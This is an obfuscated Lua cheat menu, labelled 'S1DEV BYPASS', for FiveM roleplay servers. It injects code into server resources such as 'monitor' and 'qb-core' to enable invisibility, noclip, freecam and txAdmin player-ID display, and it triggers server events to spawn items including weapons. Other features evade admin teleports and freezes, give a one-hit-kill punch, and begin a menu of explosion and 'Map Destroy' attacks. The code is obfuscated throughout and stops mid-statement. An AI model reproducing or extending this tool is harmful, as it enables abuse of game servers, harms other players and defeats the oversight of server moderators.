--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local v0="1.0.4";print("S1DEV BYPASS ACTIVE");local v1=vec2(700,1596 -(709 + 387) );local v2=vec2(1858 -(673 + 1185) ,0 -0 );local v3=481 -331 ;local v4=MachoMenuTabbedWindow("S1DEV",v2.x,v2.y,v1.x,v1.y,v3);local v5=1 -0 ;local v6=0;local function v7() local v186=math.floor((255 * math.sin(v6) * (0.5 + 0)) + 127.5 );local v187=math.floor(((191 + 64) * math.sin(v6 + 2.094 ) * (0.5 -0)) + 127.5 );local v188=math.floor(((63 + 192) * math.sin(v6 + (7.188 -3) ) * (0.5 -0)) + (2007.5 -(446 + 1434)) );MachoMenuSetAccent(v4,v186,v187,v188);v6=v6 + (1283.02 -(1040 + 243)) ;if (v6>(17.28 -11)) then v6=1847 -(559 + 1288) ;end end Citizen.CreateThread(function() while true do v7();Citizen.Wait(1956 -(609 + 1322) );end end);MachoMenuSetKeybind(v4,490 -(13 + 441) );local v8=MachoMenuAddTab(v4,"Main Menu");local v9=MachoMenuGroup(v8,"General",420,33 -24 ,1859 -1149 ,v1.y-(49 -39) );local v10=MachoMenuGroup(v8,"Tx Features",6 + 149 ,32 -23 ,150 + 270 ,v1.y-(5 + 5) );local v11=false;MachoMenuCheckbox(v9,"Show/Hide ID - Safe",function() local v189=0 -0 ;while true do if (v189==0) then v11=true;MachoMenuNotification("Menu","Show/Hide ID status: On");break;end end end,function() local v190=0;while true do if (v190==(0 + 0)) then v11=false;MachoMenuNotification("Menu","Show/Hide ID status: Off");break;end end end);local v12=false;MachoMenuCheckbox(v10,"TX Show Player IDs",function() v12=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        menuIsAccessible = true
        toggleShowPlayerIDs(true, true)
    ]]);MachoMenuNotification("TX Admin","Showing player IDs");end,function() v12=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        menuIsAccessible = true
        toggleShowPlayerIDs(false, true)
    ]]);MachoMenuNotification("TX Admin","Hiding player IDs");end);local v13=false;MachoMenuCheckbox(v10,"Invisibility",function() local v191=0 -0 ;while true do if (v191==0) then v13=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.NEVERBOKLOSEInvisibility then
            _G.NEVERBOKLOSEInvisibility = { enabled = false, wasVisible = true }
        end
        _G.NEVERBOKLOSEInvisibility.enabled = true
        local ped = PlayerPedId()
        _G.NEVERBOKLOSEInvisibility.wasVisible = IsEntityVisible(ped)
        SetEntityVisible(ped, false, false)
        
        CreateThread(function()
            while _G.NEVERBOKLOSEInvisibility and _G.NEVERBOKLOSEInvisibility.enabled do
                local currentPed = PlayerPedId()
                if currentPed and DoesEntityExist(currentPed) then
                    SetEntityVisible(currentPed, false, false)
                end
                Wait(500)
            end
        end)
    ]]);v191=1 + 0 ;end if (v191==(1 + 0)) then MachoMenuNotification("Invisibility","Invisibility ON");break;end end end,function() v13=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        if _G.NEVERBOKLOSEInvisibility and _G.NEVERBOKLOSEInvisibility.enabled then
            _G.NEVERBOKLOSEInvisibility.enabled = false
            local ped = PlayerPedId()
            if ped and DoesEntityExist(ped) then
                SetEntityVisible(ped, _G.NEVERBOKLOSEInvisibility.wasVisible, false)
            end
        end
    ]]);MachoMenuNotification("Invisibility","Invisibility OFF");end);local v14=false;local v15=false;local v16=false;local v17=false;local v18=false;local v19=false;MachoMenuCheckbox(v9,"Invisibility - Safe",function() local v192=PlayerPedId();local v193=GetVehiclePedIsIn(v192,false);MachoInjectResource("qb-core",[[
        local playerPed = PlayerPedId()
        local playerVeh = GetVehiclePedIsIn(playerPed, false)

        -- Invisible to others
        SetEntityVisible(playerPed, false, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, true)
        SetEntityAlpha(playerPed, 0, false)

        if playerVeh ~= 0 then
            SetEntityVisible(playerVeh, false, false)
            NetworkSetEntityInvisibleToNetwork(playerVeh, true)
            SetEntityAlpha(playerVeh, 0, false)
        end

        -- Visible to yourself
        SetEntityLocallyVisible(playerPed)
        SetEntityAlpha(playerPed, 255, false)

        if playerVeh ~= 0 then
            SetEntityLocallyVisible(playerVeh)
            SetEntityAlpha(playerVeh, 255, false)
        end
    ]]);v14=true;end,function() local v194=0 + 0 ;local v195;local v196;while true do if (v194==(0 + 0)) then v195=PlayerPedId();v196=GetVehiclePedIsIn(v195,false);v194=1;end if (v194==1) then MachoInjectResource("qb-core",[[
        local playerPed = PlayerPedId()
        local playerVeh = GetVehiclePedIsIn(playerPed, false)

        -- Make visible
        SetEntityVisible(playerPed, true, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, false)
        ResetEntityAlpha(playerPed)

        if playerVeh ~= 0 then
            SetEntityVisible(playerVeh, true, false)
            NetworkSetEntityInvisibleToNetwork(playerVeh, false)
            ResetEntityAlpha(playerVeh)
        end
    ]]);v14=false;break;end end end);Citizen.CreateThread(function() while true do Citizen.Wait(0);if v14 then local v684=0 + 0 ;local v685;local v686;while true do if (v684==(434 -(153 + 280))) then SetEntityVisible(v685,false,false);NetworkSetEntityInvisibleToNetwork(v685,true);v684=5 -3 ;end if (v684==(3 + 0)) then SetEntityLocallyVisible(v685);SetEntityAlpha(v685,101 + 154 ,false);v684=3 + 1 ;end if (4==v684) then if (v686~=(0 + 0)) then local v906=0 + 0 ;while true do if ((0 -0)==v906) then SetEntityLocallyVisible(v686);SetEntityAlpha(v686,158 + 97 ,false);break;end end end break;end if (v684==2) then SetEntityAlpha(v685,0,false);if (v686~=0) then local v907=667 -(89 + 578) ;while true do if (v907==1) then SetEntityAlpha(v686,0,false);break;end if (v907==(0 + 0)) then SetEntityVisible(v686,false,false);NetworkSetEntityInvisibleToNetwork(v686,true);v907=1;end end end v684=5 -2 ;end if ((1049 -(572 + 477))==v684) then v685=PlayerPedId();v686=GetVehiclePedIsIn(v685,false);v684=1;end end end end end);local v20=false;local v21=PlayerPedId();local v22=1 + 1 ;local v23="move_jump";local v24="land_roll";function LoadAnimDict(v197) local v198=0 + 0 ;while true do if (v198==(0 + 0)) then RequestAnimDict(v197);while  not HasAnimDictLoaded(v197) do Citizen.Wait(86 -(84 + 2) );end break;end end end MachoMenuCheckbox(v9,"Noclip - Safe",function() MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local fallAnimDict = "move_jump"
        local fallAnim = "land_roll"
        RequestAnimDict(fallAnimDict)
        while not HasAnimDictLoaded(fallAnimDict) do
            Citizen.Wait(0)
        end
        TaskPlayAnim(playerPed, fallAnimDict, fallAnim, 8.0, -8.0, -1, 49, 0, false, false, false)
        SetPedToRagdoll(playerPed, 1000, 1000, 0, true, true, false)
        SetEntityCollision(playerPed, false, false)
        SetEntityAlpha(playerPed, 150, false)
        SetEntityInvincible(playerPed, true)
    ]]);v20=true;end,function() MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        ClearPedTasks(playerPed)
        SetEntityCollision(playerPed, true, true)
        ResetEntityAlpha(playerPed)
        SetEntityInvincible(playerPed, false)
    ]]);v20=false;end);local v12=false;MachoMenuCheckbox(v10,"TX Show Player IDs",function() v12=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        menuIsAccessible = true
        toggleShowPlayerIDs(true, true)
    ]]);MachoMenuNotification("TX Admin","Showing player IDs");end,function() local v199=0;while true do if (v199==0) then v12=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        menuIsAccessible = true
        toggleShowPlayerIDs(false, true)
    ]]);v199=1 -0 ;end if (v199==1) then MachoMenuNotification("TX Admin","Hiding player IDs");break;end end end);local v25=MachoMenuInputbox(v9,"Item Name","e.g., weapon_pistol");local v26=MachoMenuInputbox(v9,"Amount","1");MachoMenuButton(v9,"Spawn Item (RT Lumberjack)",function() local v200=MachoMenuGetInputbox(v25);local v201=tonumber(MachoMenuGetInputbox(v26)) or (1 + 0) ;if (v200 and (v200~="")) then if (v201>0) then TriggerServerEvent("rt-lumberjack:server:giveItem",v200,v201);MachoMenuNotification("Item Spawn","Spawning "   .. v200   .. " x"   .. v201 );print("[Item Spawn] Spawning "   .. v200   .. " x"   .. v201 );else MachoMenuNotification("Error","Please enter a valid amount!");end else MachoMenuNotification("Error","Please enter an item name!");end end);local v27=MachoMenuInputbox(v9,"22Item Name","e.g., LOCKPICK");local v28=MachoMenuInputbox(v9,"22Amount","1");MachoMenuButton(v9,"Spawn Item (RT Steal)",function() local v202=842 -(497 + 345) ;local v203;local v204;while true do if (v202==(1 + 0)) then if (v203 and (v203~="")) then if (v204>0) then local v892=0 + 0 ;local v893;while true do if (v892==(1333 -(605 + 728))) then v893=false;pcall(function() TriggerServerEvent("rt-steal:server:giveItem",v203,v204);v893=true;end);v892=1 + 0 ;end if (v892==2) then print("[RT Steal] Spawning "   .. v203   .. " x"   .. v204 );break;end if (v892==(1 -0)) then if  not v893 then local v955=0 + 0 ;local v956;while true do if (v955==(0 -0)) then v956=nil;if (GetResourceState("rt-steal")=="started") then v956="rt-steal";elseif (GetResourceState("monitor")=="started") then v956="monitor";elseif (GetResourceState("qb-core")=="started") then v956="qb-core";else v956="ox_inventory";end v955=1 + 0 ;end if ((2 -1)==v955) then MachoInjectResource2(NewThreadNs,v956,string.format([[
                    local itemName = "%s"
                    local amount = %d
                    TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
                    print("RT Steal Item: Spawned " .. itemName .. " x" .. amount)
                    TriggerEvent('chat:addMessage', { args = { '^2RT Steal:', 'Spawned ' .. itemName .. ' x' .. amount } })
                ]],v203,v204));break;end end end MachoMenuNotification("RT Steal","Spawning "   .. v203   .. " x"   .. v204 );v892=2 + 0 ;end end else MachoMenuNotification("Error","Please enter a valid amount!");end else MachoMenuNotification("Error","Please enter an item name!");end break;end if (v202==(489 -(457 + 32))) then v203=MachoMenuGetInputbox(v27);v204=tonumber(MachoMenuGetInputbox(v28)) or 1 ;v202=1 + 0 ;end end end);MachoMenuButton(v9,"FB Clothes",function() local v205=1402 -(832 + 570) ;while true do if (v205==(0 + 0)) then TriggerEvent("FBClothing:client:openOutfitMenu");MachoMenuNotification("FB Clothes","Opening FB outfit menu...");break;end end end);MachoMenuButton(v9,"FB Revive",function() TriggerEvent("FB_Ems:triggers:client:revivePlayer");MachoMenuNotification("FB Revive","Revive requested...");end);MachoMenuButton(v9,"rc2 Revive",function() TriggerEvent("hospital:client:Revive");MachoMenuNotification("Hospital","Revive requested...");end);MachoMenuButton(v9,"s1 Teleport to Waypoint",function() local v206=GetFirstBlipInfoId(8);if  not DoesBlipExist(v206) then MachoMenuNotification("s1","No waypoint set!");else local v513=0 + 0 ;local v514;local v515;local v516;while true do if (v513==(3 -2)) then v516=v515;if IsPedInAnyVehicle(v515,false) then v516=GetVehiclePedIsIn(v515,false);end v513=1 + 1 ;end if (v513==(798 -(588 + 208))) then SetEntityCoordsNoOffset(v516,v514.x,v514.y,v514.z,false,false,false,false);MachoMenuNotification("s1","Teleported to waypoint!");break;end if (v513==(0 -0)) then v514=GetBlipInfoIdCoord(v206);v515=PlayerPedId();v513=1801 -(884 + 916) ;end end end end);local v29=false;MachoMenuCheckbox(v9,"s1 Super Jump",function() v29=true;MachoMenuNotification("s1","Super Jump ON");end,function() v29=false;MachoMenuNotification("s1","Super Jump OFF");end);local v30=6 -3 ;local v31=MachoMenuSlider(v9,"s1 Fast Run Speed",v30,1,10,"x",1 + 0 ,function(v207) v30=v207;end);local v32=false;MachoMenuCheckbox(v9,"s1 Fast Run",function() v32=true;MachoMenuNotification("s1","Fast Run ACTIVE (Speed: "   .. v30   .. "x)" );Citizen.CreateThread(function() local v471=653 -(232 + 421) ;while true do if ((1889 -(1569 + 320))==v471) then while v32 do local v764=0 + 0 ;while true do if (v764==(0 + 0)) then Citizen.Wait(0 -0 );SetPedMoveRateOverride(PlayerPedId(),v30 + (605 -(316 + 289)) );break;end end end SetPedMoveRateOverride(PlayerPedId(),2 -1 );break;end end end);end,function() v32=false;SetPedMoveRateOverride(PlayerPedId(),1);MachoMenuNotification("s1","Fast Run OFF");end);local v33=false;MachoMenuCheckbox(v9,"s1 No Ragdoll",function() local v208=0;while true do if (0==v208) then v33=true;SetPedCanRagdoll(PlayerPedId(),false);v208=1;end if (v208==(1 + 0)) then MachoMenuNotification("s1","No Ragdoll ON");break;end end end,function() v33=false;SetPedCanRagdoll(PlayerPedId(),true);MachoMenuNotification("s1","No Ragdoll OFF");end);local v34=false;MachoMenuCheckbox(v9,"s1 Anti AFK",function() local v209=1453 -(666 + 787) ;while true do if (v209==0) then v34=true;MachoMenuNotification("s1","Anti AFK ACTIVE");v209=426 -(360 + 65) ;end if (v209==(1 + 0)) then Citizen.CreateThread(function() while v34 do Citizen.Wait(5000);local v765=PlayerPedId();local v766=GetEntityCoords(v765);SetEntityCoordsNoOffset(v765,v766.x + 0.01 ,v766.y + (254.01 -(79 + 175)) ,v766.z,false,false,false,false);end end);break;end end end,function() local v210=0 -0 ;while true do if (v210==(0 + 0)) then v34=false;MachoMenuNotification("s1","Anti AFK OFF");break;end end end);local v35=false;MachoMenuCheckbox(v9,"s1 Infinite Stamina",function() local v211=0 -0 ;while true do if (v211==(1 -0)) then Citizen.CreateThread(function() while v35 do local v767=0;while true do if (v767==0) then Citizen.Wait(1399 -(503 + 396) );ResetPlayerStamina(PlayerPedId());break;end end end end);break;end if (v211==(181 -(92 + 89))) then v35=true;MachoMenuNotification("s1","Infinite Stamina ACTIVE");v211=1 -0 ;end end end,function() local v212=0 + 0 ;while true do if (v212==(0 + 0)) then v35=false;MachoMenuNotification("s1","Infinite Stamina OFF");break;end end end);local v36=false;MachoMenuCheckbox(v9,"s1 Infinite Oxygen",function() v36=true;SetPedDiesInWater(PlayerPedId(),false);MachoMenuNotification("s1","Infinite Oxygen ON");end,function() v36=false;SetPedDiesInWater(PlayerPedId(),true);MachoMenuNotification("s1","Infinite Oxygen OFF");end);local v37=false;MachoMenuCheckbox(v9,"s1 Disable Collision",function() v37=true;SetEntityCollision(PlayerPedId(),false,false);MachoMenuNotification("s1","Disable Collision ON");end,function() local v213=0;while true do if (v213==(0 -0)) then v37=false;SetEntityCollision(PlayerPedId(),true,true);v213=1 + 0 ;end if (v213==(2 -1)) then MachoMenuNotification("s1","Disable Collision OFF");break;end end end);local v38=false;MachoMenuCheckbox(v9,"s1 Fast Punch",function() local v214=0;while true do if (v214==(0 + 0)) then v38=true;MachoMenuNotification("s1","Fast Punch ON");break;end end end,function() local v215=0;while true do if (v215==(0 + 0)) then v38=false;MachoMenuNotification("s1","Fast Punch OFF");break;end end end);local v39=false;MachoMenuCheckbox(v9,"s1 Super Punch",function() local v216=0 -0 ;while true do if (v216==(1 + 0)) then MachoMenuNotification("s1","Super Punch ON (One-hit kill)");break;end if (v216==(0 -0)) then v39=true;SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"),1001244 -(485 + 759) );v216=2 -1 ;end end end,function() v39=false;SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"),1190 -(442 + 747) );MachoMenuNotification("s1","Super Punch OFF");end);MachoMenuButton(v9,"Open face Menu",function() TriggerEvent("m3-clothingmenu:client:OpenSurgeonShop");MachoMenuNotification("Clothes","Opening clothes menu...");end);MachoMenuButton(v9,"Open Barber Shop",function() TriggerEvent("m3-clothingmenu:client:OpenBarberShop");MachoMenuNotification("Barber","Opening barber shop...");end);MachoMenuButton(v9,"Open Clothing Shop",function() TriggerEvent("m3-clothingmenu:client:openClothingShopMenu");MachoMenuNotification("Clothing Shop","Opening clothing shop...");end);MachoMenuButton(v9,"RT Revive 2",function() TriggerEvent("RespectEMS:triggers:client:revivePlayer");MachoMenuNotification("RT Revive 2","Revive requested...");end);MachoMenuButton(v9,"Change Character",function() local v217=1135 -(832 + 303) ;while true do if (v217==(946 -(88 + 858))) then TriggerEvent("qb-MultiCharacter:server:openui");MachoMenuNotification("Character","Opening character selection...");break;end end end);MachoMenuButton(v9,"s1 Remove PTFX",function() Citizen.CreateThread(function() local v472=0 + 0 ;local v473;while true do if (v472==1) then RemoveParticleFxFromEntity(PlayerPedId());MachoMenuNotification("s1","Removed PTFX effects");break;end if (v472==(0 + 0)) then v473=GetEntityCoords(PlayerPedId());RemoveParticleFxInRange(v473.x,v473.y,v473.z,9 + 191 );v472=790 -(766 + 23) ;end end end);end);MachoMenuButton(v9,"s1 Stop All Sounds",function() Citizen.CreateThread(function() local v474=0 -0 ;while true do if (v474==0) then for v768=1 -0 ,263 -163  do StopSound(v768);end MachoMenuNotification("s1","Stopped all sounds");break;end end end);end);MachoMenuButton(v9,"s1 Remove Admin Freeze",function() for v475=3 -2 ,1075 -(1036 + 37)  do EnableAllControlActions(v475);end FreezeEntityPosition(PlayerPedId(),false);SetEntityCollision(PlayerPedId(),false,true);Citizen.Wait(213 + 87 );SetEntityCollision(PlayerPedId(),true,true);Citizen.Wait(4868 -2368 );if IsEntityPositionFrozen(PlayerPedId()) then local v517=0 + 0 ;while true do if (v517==0) then MachoMenuNotification("s1","Detected still frozen, trying again...");for v830=1,1482 -(641 + 839)  do EnableAllControlActions(v830);end v517=914 -(910 + 3) ;end if (v517==1) then for v831=2 -1 ,10 do FreezeEntityPosition(PlayerPedId(),false);end MachoMenuNotification("s1","Admin freeze removed");break;end end else MachoMenuNotification("s1","Admin freeze removed");end end);MachoMenuButton(v9,"s1 Remove Attached Objects",function() Citizen.CreateThread(function() local v476=1684 -(1466 + 218) ;local v477;local v478;while true do if ((1 + 0)==v476) then for v769,v770 in ipairs(v477) do if DoesEntityExist(v770) then DetachEntity(v770,true,true);v478=v478 + (1149 -(556 + 592)) ;end end MachoMenuNotification("s1","Removed "   .. v478   .. " attached objects" );break;end if (v476==0) then v477=GetGamePool("CObject");v478=0;v476=1 + 0 ;end end end);end);local v40=false;MachoMenuCheckbox(v9,"s1 Disable Hostile Peds",function() local v218=808 -(329 + 479) ;while true do if (v218==(855 -(174 + 680))) then Citizen.CreateThread(function() while v40 do local v771=0 -0 ;while true do if (v771==0) then Citizen.Wait(0 -0 );SetPedResetFlag(PlayerPedId(),89 + 35 ,true);v771=1;end if (v771==1) then SetEveryoneIgnorePlayer(PlayerPedId(),true);break;end end end end);break;end if (v218==(739 -(396 + 343))) then v40=true;MachoMenuNotification("s1","Hostile peds disabled");v218=1 + 0 ;end end end,function() local v219=1477 -(29 + 1448) ;while true do if (v219==(1389 -(135 + 1254))) then v40=false;MachoMenuNotification("s1","Hostile peds enabled");break;end end end);local v41=false;local v42=nil;MachoMenuCheckbox(v9,"s1 Evade Admin TP",function() v41=true;v42=GetEntityCoords(PlayerPedId());MachoMenuNotification("s1","Admin TP evasion activated");Citizen.CreateThread(function() while v41 do local v518=0;local v519;local v520;while true do if (v518==0) then Citizen.Wait(376 -276 );v519=GetEntityCoords(PlayerPedId());v518=1;end if (v518==(4 -3)) then v520= #(v42-v519);if (v520>(34 + 16)) then SetEntityCoordsNoOffset(PlayerPedId(),v42.x,v42.y,v42.z,false,false,false,true);MachoMenuNotification("s1","Blocked admin teleport!");else v42=v519;end break;end end end end);end,function() v41=false;MachoMenuNotification("s1","Admin TP evasion deactivated");end);local v43=false;MachoMenuCheckbox(v9,"s1 Block Admin Freeze",function() v43=true;MachoMenuNotification("s1","Admin freeze block activated");Citizen.CreateThread(function() while v43 do Citizen.Wait(1527 -(389 + 1138) );FreezeEntityPosition(PlayerPedId(),false);end end);end,function() local v220=0;while true do if ((574 -(102 + 472))==v220) then v43=false;MachoMenuNotification("s1","Admin freeze block deactivated");break;end end end);local v44=false;MachoMenuCheckbox(v9,"s1 Anti Fire",function() v44=true;MachoMenuNotification("s1","Anti fire activated");Citizen.CreateThread(function() while v44 do Citizen.Wait(0 + 0 );StopEntityFire(PlayerPedId());end end);end,function() local v221=0 + 0 ;while true do if (v221==0) then v44=false;MachoMenuNotification("s1","Anti fire deactivated");break;end end end);local v45=false;MachoMenuCheckbox(v9,"s1 Anti Attach",function() local v222=0;while true do if ((1 + 0)==v222) then Citizen.CreateThread(function() while v45 do Citizen.Wait(0);for v832,v833 in ipairs(GetGamePool("CVehicle")) do if (IsEntityAttachedToAnyPed(v833) and (GetEntityAttachedTo(v833)==PlayerPedId())) then local v908=0;while true do if (v908==(1545 -(320 + 1225))) then NetworkRequestControlOfEntity(v833);DetachEntity(v833,0,true);break;end end end end for v834,v835 in ipairs(GetGamePool("CObject")) do if (IsEntityAttachedToAnyPed(v835) and (GetEntityAttachedTo(v835)==PlayerPedId())) then NetworkRequestControlOfEntity(v835);DetachEntity(v835,0,true);end end end end);break;end if (v222==(0 -0)) then v45=true;MachoMenuNotification("s1","Anti attach activated");v222=1 + 0 ;end end end,function() v45=false;MachoMenuNotification("s1","Anti attach deactivated");end);local v46=false;MachoMenuCheckbox(v9,"s1 Anti VDM",function() local v223=1464 -(157 + 1307) ;while true do if (v223==0) then v46=true;MachoMenuNotification("s1","Anti VDM activated");v223=1860 -(821 + 1038) ;end if (v223==1) then Citizen.CreateThread(function() while v46 do local v772=0 -0 ;local v773;local v774;while true do if (0==v772) then Citizen.Wait(0 + 0 );v773=PlayerPedId();v772=1 -0 ;end if (v772==(1 + 0)) then v774=GetEntityCoords(v773);for v927,v928 in ipairs(GetGamePool("CVehicle")) do if DoesEntityExist(v928) then local v942=0 -0 ;local v943;local v944;while true do if (v942==0) then v943=GetEntityCoords(v928);v944= #(v774-v943);v942=1027 -(834 + 192) ;end if (v942==(1 + 0)) then if (v944<=(13 + 37)) then SetEntityNoCollisionEntity(v928,v773,true);end break;end end end end break;end end end end);break;end end end,function() local v224=0 + 0 ;while true do if (v224==0) then v46=false;MachoMenuNotification("s1","Anti VDM deactivated");break;end end end);local v47=false;MachoMenuCheckbox(v9,"s1 Anti Handcuff",function() local v225=0 -0 ;while true do if (v225==(305 -(300 + 4))) then Citizen.CreateThread(function() while v47 do Citizen.Wait(0);EnableAllControlActions(0);EnableAllControlActions(1 + 0 );end end);break;end if (v225==(0 -0)) then v47=true;MachoMenuNotification("s1","Anti handcuff activated");v225=1;end end end,function() local v226=0;while true do if (0==v226) then v47=false;MachoMenuNotification("s1","Anti handcuff deactivated");break;end end end);MachoMenuButton(v9,"s1 Evade Hostage Situation",function() MachoMenuNotification("s1","Hostage evade activated");end);Citizen.CreateThread(function() while true do local v479=362 -(112 + 250) ;while true do if (v479==(0 + 0)) then Citizen.Wait(0 -0 );v21=PlayerPedId();v479=1 + 0 ;end if (v479==(1 + 0)) then if v20 then local v836=0 + 0 ;local v837;local v838;local v839;local v840;while true do if (v836==2) then if IsControlPressed(0,17 + 17 ) then v837=v837 + vector3(v840 * math.cos(v839) ,v840 * math.sin(v839) ,0 + 0 ) ;end if IsControlPressed(1414 -(1001 + 413) ,78 -43 ) then v837=v837 + vector3( -v840 * math.cos(v839) , -v840 * math.sin(v839) ,0) ;end if IsControlPressed(0,21) then v837=v837 + vector3(0,0,v840) ;end v836=885 -(244 + 638) ;end if (v836==3) then if IsControlPressed(0,729 -(627 + 66) ) then v837=v837 + vector3(0 -0 ,0, -v840) ;end SetEntityCoordsNoOffset(v21,v837.x,v837.y,v837.z,true,true,true);if  not IsEntityPlayingAnim(v21,v23,v24,3) then TaskPlayAnim(v21,v23,v24,610 -(512 + 90) , -(1914 -(1665 + 241)), -(718 -(373 + 344)),23 + 26 ,0 + 0 ,false,false,false);end v836=4;end if (v836==(2 -1)) then v840=v22;if IsControlPressed(0 -0 ,32) then v837=v837 + vector3(v840 * math.sin(v839) ,v840 *  -math.cos(v839) ,1099 -(35 + 1064) ) ;end if IsControlPressed(0 + 0 ,70 -37 ) then v837=v837 + vector3( -v840 * math.sin(v839) , -v840 *  -math.cos(v839) ,0 + 0 ) ;end v836=2;end if (v836==(1240 -(298 + 938))) then if  not IsPedRagdoll(v21) then SetPedToRagdoll(v21,2259 -(233 + 1026) ,2666 -(636 + 1030) ,0 + 0 ,true,true,false);end SetEntityRotation(v21,0 + 0 ,0 + 0 ,v838.z,1 + 1 ,true);break;end if (v836==(221 -(55 + 166))) then v837=GetEntityCoords(v21);v838=GetGameplayCamRot(1 + 1 );v839=math.rad(v838.z);v836=1 + 0 ;end end end break;end end end end);local v48=vector3(0 -0 ,297 -(36 + 261) ,0);local v49=false;local v21=PlayerPedId();local v50=0;local v51=nil;local v52=false;local v53=2;local v23="move_jump";local v24="land_roll";function LoadAnimDict(v227) local v228=0 -0 ;while true do if (v228==(1368 -(34 + 1334))) then RequestAnimDict(v227);while  not HasAnimDictLoaded(v227) do Citizen.Wait(0);end break;end end end function CreateCamera() local v229=0;local v230;while true do if (v229==(1 + 1)) then SetCamCoord(v51,v48.x,v48.y,v48.z);SetCamRot(v51,0,0,v50,2 + 0 );v229=1286 -(1035 + 248) ;end if (v229==(24 -(20 + 1))) then RenderScriptCams(true,false,0,true,true);v49=true;v229=4;end if (v229==(1 + 0)) then v50=GetEntityHeading(v21);v51=CreateCam("DEFAULT_SCRIPTED_FLY_CAMERA",true);v229=321 -(134 + 185) ;end if (v229==(1137 -(549 + 584))) then FreezeEntityPosition(v21,true);v52=true;break;end if (v229==(685 -(314 + 371))) then v230=GetEntityCoords(v21,true);v48=v230 + vector3(0,0,1.5) ;v229=3 -2 ;end end end function DestroyCamera() if v49 then RenderScriptCams(false,false,968 -(478 + 490) ,true,true);DestroyCam(v51,false);v49=false;FreezeEntityPosition(v21,false);v52=false;end end MachoMenuCheckbox(v9,"Freecam - Safe",function() MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local fallAnimDict = "move_jump"
        local fallAnim = "land_roll"
        RequestAnimDict(fallAnimDict)
        while not HasAnimDictLoaded(fallAnimDict) do
            Citizen.Wait(0)
        end
        TaskPlayAnim(playerPed, fallAnimDict, fallAnim, 8.0, -8.0, -1, 49, 0, false, false, false)
        SetPedToRagdoll(playerPed, 1000, 1000, 0, true, true, false)
        SetEntityCollision(playerPed, false, false)
        SetEntityAlpha(playerPed, 150, true)
        SetEntityInvincible(playerPed, true)
    ]]);CreateCamera();end,function() MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        ClearPedTasks(playerPed)
        SetEntityCollision(playerPed, true, true)
        ResetEntityAlpha(playerPed)
        SetEntityInvincible(playerPed, true)
    ]]);DestroyCamera();end);Citizen.CreateThread(function() while true do local v480=0;while true do if (v480==1) then if v49 then local v841=0 + 0 ;local v842;local v843;local v844;local v845;local v846;local v847;local v848;local v849;while true do if (1==v841) then if IsControlPressed(1172 -(786 + 386) ,33) then v842=v842 + vector3(v845 * math.sin(v844) ,v845 *  -math.cos(v844) ,0 -0 ) ;end if IsControlPressed(1379 -(1055 + 324) ,1372 -(1093 + 247) ) then v842=v842 + vector3( -v845 * math.sin(v844) , -v845 *  -math.cos(v844) ,0) ;end if IsControlPressed(0 + 0 ,4 + 31 ) then v842=v842 + vector3(v845 * math.cos(v844) ,v845 * math.sin(v844) ,0) ;end if IsControlPressed(0 -0 ,115 -81 ) then v842=v842 + vector3( -v845 * math.cos(v844) , -v845 * math.sin(v844) ,0) ;end v841=5 -3 ;end if (4==v841) then SetCamRot(v51,v848,0,v849,2);if  not IsEntityPlayingAnim(v21,v23,v24,7 -4 ) then TaskPlayAnim(v21,v23,v24,3 + 5 , -(30 -22), -(3 -2),37 + 12 ,0 -0 ,false,false,false);end if  not IsPedRagdoll(v21) then SetPedToRagdoll(v21,1688 -(364 + 324) ,1000,0,true,true,false);end break;end if ((7 -4)==v841) then v847=GetDisabledControlNormal(0 -0 ,1 + 1 ) *  -(0.25 -0) ;v848=math.max( -89,math.min(142 -53 ,v848));v849=v843.z-(v846 * v845) ;v848=math.max( -89,math.min(89,v848));v841=11 -7 ;end if (v841==(1270 -(1249 + 19))) then if IsControlPressed(0,40 + 4 ) then v842=v842 + vector3(0 -0 ,0,v845) ;end if IsControlPressed(1086 -(686 + 400) ,30 + 8 ) then v842=v842 + vector3(229 -(73 + 156) ,0, -v845) ;end SetCamCoord(v51,v842.x,v842.y,v842.z);v846=GetDisabledControlNormal(0 + 0 ,812 -(721 + 90) ) * (0.25 + 0) ;v841=9 -6 ;end if (0==v841) then v842=GetCamCoord(v51);v843=GetCamRot(v51,2);v844=math.rad(v843.z);v845=v53;v841=1;end end end break;end if (v480==(470 -(224 + 246))) then Citizen.Wait(0 -0 );v21=PlayerPedId();v480=1 -0 ;end end end end);local v54=false;local v55=nil;local v56=false;local v57=nil;local v58={"Select","Teleportation","RPG","Explosion","Shoot Car","Shoot Boat","Shoot Plane","Map Destroy"};local v59=1994 -(1238 + 755) ;local v60={"adder","zentorno","t20","nero","fmj","sultan","kuruma2","entityxf","osiris","reaper"};local v61={"dinghy","jetmax","suntrap","tropic","seashark","squalo","marquis","predator"};local v62={"lazer","hydra","besra","vestra","nimbus","shamal","duster","mammatus","velum","stunt"};local v63=1 + 0 ;local v64=1;local v65=1 + 0 ;local 